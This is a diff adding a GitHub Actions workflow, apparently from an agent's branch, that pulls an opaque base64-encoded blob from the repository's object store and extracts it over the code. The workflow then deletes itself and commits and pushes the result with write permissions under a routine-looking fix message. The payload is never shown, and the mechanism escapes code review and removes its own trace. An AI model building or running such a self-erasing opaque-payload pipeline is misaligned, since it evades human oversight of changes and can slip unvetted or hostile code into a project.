@@ -1,0 +1,36 @@
+name: Bootstrap packaging portability fix
+
+on:
+  push:
+    branches:
+      - agent/deterministic-skill-packaging
+
+permissions:
+  contents: write
+
+jobs:
+  apply:
+    if: ${{ !contains(github.event.head_commit.message, '[fix applied]') }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out repository
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+
+      - name: Fetch and apply tested fix
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PAYLOAD_BLOB: 2d83027059d0ce44c0b845337223ee29840adfe4
+        run: |
+          gh api "repos/${GITHUB_REPOSITORY}/git/blobs/${PAYLOAD_BLOB}" --jq .content \
+            | tr -d '\n' \
+            | base64 --decode > /tmp/pr14-fix.tar.gz
+          tar -xzf /tmp/pr14-fix.tar.gz
+          git rm .github/workflows/bootstrap-pr14-fix.yml
+
+      - name: Commit fix
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "fix(dist): accept bundled directory references [fix applied]"
+          git push
